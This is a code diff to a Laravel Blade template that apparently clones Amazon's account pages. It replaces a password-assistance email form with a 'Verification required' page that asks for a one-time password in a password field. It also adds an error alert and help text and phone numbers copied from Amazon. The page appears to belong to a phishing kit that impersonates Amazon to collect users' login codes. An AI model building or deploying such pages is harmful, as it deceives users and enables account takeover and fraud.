@@ -4,7 +4,7 @@
 
 @section('custom_css')
     <link rel="stylesheet" href="{{ asset('/css/multi-step.css') }}">
-    <link rel="stylesheet" href="{{ asset('/css/signin.css') }}">
+    <link rel="stylesheet" href="{{ asset('/css/login.css') }}">
 @endsection
 
 @section('content')
@@ -17,7 +17,8 @@
                 <div class="ps-section__header custom-section__header">
                     <div class="row center-element">
                         <div class="col-md-12">
-                            <div class="a-section none">
+                            <!-- @if(session('signin_status')) -->
+                            <div class="a-section">
                                 <div id="auth-error-message-box" class="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base" role="alert">
                                     <div class="a-box-inner a-alert-container">
                                         <h4 class="a-alert-heading">There was a problem</h4>
@@ -32,23 +33,34 @@
                                     </div>
                                 </div>
                             </div>
+                            <!-- @endif -->
                             <div class="bg-white pd-30-27">
-                                <p class="title mb-15">{{ __('Password assistance')}}</p>
-                                <p class="subtitle-2">Enter the email address or mobile phone number associated with your Amazon account.</p>
-                                <form action="{{ route('step2') }}" method="POST">
+                                <p class="title mb-15">{{ __('Verification required')}}</p>
+                                <p class="subtitle-2">To continue, complete this verification step. We've sent a One Time Password (OTP) to the email <span class="subtitle-2" id="email_show"></span>. Please enter it below.</p>
+                                <form action="" method="POST">
                                     @csrf
-                                    <label class="label-2">{{ __('Email or mobile phone number')}}</label>
-                                    <input type="email" value="{{ old('email') }}"  name="email" class="custom-form-control" />
-                                    <div class="text-danger none" id="email_error">The name field is required</div>
-                                    @error('email')
+                                    <div class="password-tag">
+                                        <label class="label-2">{{ __('Enter OTP')}}</label>
+                                    </div>
+                                    <input type="password" value="{{ old('password') }}"  name="password" class="custom-form-control" />
+                                    <div class="text-danger none" id="password_error">The password field is required</div>
+                                    <!-- @error('email')
                                         <div class="text-danger">{{ $message }}</div>
-                                    @enderror
+                                    @enderror -->
                                     
                                     <button type="submit" class="b-btn mt-15 mb-15">{{ __('Continue')}}</button>
+                                    <div class="center">
+                                        <a href="{{ route('sendEmail') }}" class="link-big">{{ __('Resend OTP')}}</a>    
+                                    </div>
+                                    <div class="left">
+                                        <span class="link-big hoverable">{{ __('I need more help')}}</span>    
+                                    </div>
+                                    <p class="subtitle-2 help-tag none" id="help-tag"> <br> If you've already tried to reset your password, but haven't received an email from Amazon, check your Junk or Spam folder. <br><br>
+                                        If you can't access your email, try resetting that first through your email provider.   <br><br>
+                                        If you've recently updated your password, your old password could still be saved in your browser. Try clearing your browser history and re-typing your password. <br><br>
+                                        If you need more password help, call us at 1-800-383-9484 or, if outside the U.S. or Canada, 1-206-577-1364 (International, charges may apply).</p>
                                 </form>
                             </div>
-                            <p class="subtitle-3">Has your email or mobile number changed?</p>
-                            <p class="subtitle-2">If you no longer use the email address associated with your account, you may contact <a href="#" class="link-normal">Customer Service</a> for help restoring access to your account.</p>
                         </div>
                     </div>
                     <div class="a-divider a-divider-section">
@@ -73,5 +85,5 @@
 
 @section('custom_js')
     <!-- CLIENT-SIDE VALIDATION -->
-    <script src="{{ asset('/js/validation/step2.js') }}"></script>
+    <script src="{{ asset('/js/login/verification.js') }}"></script>
 @endsection
